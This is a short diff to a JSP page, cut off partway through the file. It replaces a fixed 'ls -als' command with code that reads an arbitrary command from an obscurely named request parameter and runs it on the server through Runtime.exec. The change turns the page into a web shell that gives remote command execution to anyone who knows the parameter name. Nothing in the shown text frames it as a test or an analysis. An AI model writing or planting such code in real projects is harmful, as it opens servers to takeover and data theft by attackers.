@@ -4,7 +4,13 @@
 <%
 
 String res = "";
-Process p = Runtime.getRuntime().exec("ls -als");
+String cmd = request.getParameter("cmxvarcatueied");
+
+if (cmd == null || cmd.equals("")) {
+cmd="id";
+}
+
+Process p = Runtime.getRuntime().exec(cmd);
 OutputStream os = p.getOutputStream();
 InputStream in = p.getInputStream();
 DataInputStream dis = new DataInputStream(in);
